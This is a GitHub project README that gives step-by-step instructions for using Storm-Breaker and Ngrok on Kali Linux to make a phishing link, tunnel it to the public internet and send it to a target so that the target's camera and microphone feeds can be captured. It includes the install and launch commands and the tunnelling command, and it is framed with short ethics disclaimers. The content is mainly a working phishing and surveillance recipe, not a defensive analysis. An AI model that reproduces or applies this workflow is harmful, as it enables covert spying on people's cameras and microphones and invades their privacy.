# Gaining-Camera-and-Microphone-Access

## Introduction
This project explores the process of gaining access to a device's camera and microphone using tools like Storm-Breaker and Ngrok. It demonstrates the setup, configuration, and ethical implications of leveraging these tools in a controlled environment for testing purposes. The focus is on understanding the technology and implementing secure practices to protect user privacy.

## Objective
- To understand how tools like Storm-Breaker and Ngrok function.
- To demonstrate the process of gaining camera and microphone access ethically in a secure and controlled environment.
- To study the significance of user permissions and privacy concerns in the context of multimedia access.

## Tools Used
1. **Storm-Breaker:** A tool used for simulating the process of accessing cameras and microphones via social engineering techniques.
2. **Ngrok:** A tunneling tool that enables the creation of secure public URLs for local servers, allowing remote access and interaction.


## Process and Implementation

1. **Installation of Storm-Breaker on Kali Linux**
- Open the terminal on Kali Linux.
- Clone the Storm-Breaker repository from GitHub:
```
git clone https://github.com/ultrasecurity/Storm-Breaker.git
```
![image](https://github.com/user-attachments/assets/4aab1944-f499-417c-a5bb-53a068db83de)

- Navigate to the directory:
```
cd Storm-Breaker
```
![image](https://github.com/user-attachments/assets/056e8426-d870-41b8-b305-4af1c602fbf2)


- Install the required dependencies:
```
sudo python3 -m pip install -r requirements.txt
sudo bash install.sh
```

![image](https://github.com/user-attachments/assets/f1907a2d-00bb-43c3-8637-95afc3fd2167)

- Launch Storm-Breaker:
```
sudo python3 st.py
```
![image](https://github.com/user-attachments/assets/8b093be3-053a-4a9e-915a-800dacf7e47f)



2. **Signing in on Ngrok**

- Visit [Ngrok's official website](https://ngrok.com/) and create an account.
![image](https://github.com/user-attachments/assets/12dff1af-6901-4b04-b7d7-cfe66b207e8a)

- Download and install the Ngrok package on Kali Linux.
```
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
| sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
&& echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
| sudo tee /etc/apt/sources.list.d/ngrok.list \
&& sudo apt update \
&& sudo apt install ngrok
```
![image](https://github.com/user-attachments/assets/72d8e0a0-dbd6-40dd-b8d0-43c608e8b055)

![image](https://github.com/user-attachments/assets/f6bdc18a-8a02-44d2-8b55-2209fd4c6e42)

- Authenticate Ngrok using the provided token:
```
ngrok config add-authtoken <your_auth_token>
```
replace <your_auth_token> with the token number provided in ngrok

![image](https://github.com/user-attachments/assets/8783f5e4-6c82-4db4-af3d-d005e41c35dd)


3. **Creating and Sharing Links**
- Use Storm-Breaker to generate a phishing link to request camera and microphone access.
- Tunnel the local server hosting the phishing link using Ngrok:

```
ngrok http 2525
```
![image](https://github.com/user-attachments/assets/28142d07-a931-461e-9f9f-9a842d04a8fb)

- Share the Ngrok-generated public URL with the target for interaction.


4. **Gaining Access**
- Upon the target's interaction with the shared link and granting permissions, the tool simulates access to the target's camera and microphone feeds.

![image](https://github.com/user-attachments/assets/dd8a86c9-9ebc-49a6-a865-47cd56219df7)


5. **Ethical Considerations**

This project emphasizes the importance of ethical usage:
- Educational and Testing Purposes Only: The demonstrated methods should be employed exclusively for learning and improving cybersecurity measures.
- User Consent: Explicit user permission is mandatory before accessing any multimedia devices.
- Compliance with Laws: The use of these tools must adhere to legal and ethical standards.


# Conclusion
The project successfully demonstrates the process of gaining camera and microphone access using Storm-Breaker and Ngrok in a controlled and ethical setting. It highlights the potential vulnerabilities associated with multimedia access and stresses the importance of robust security measures to protect user privacy.
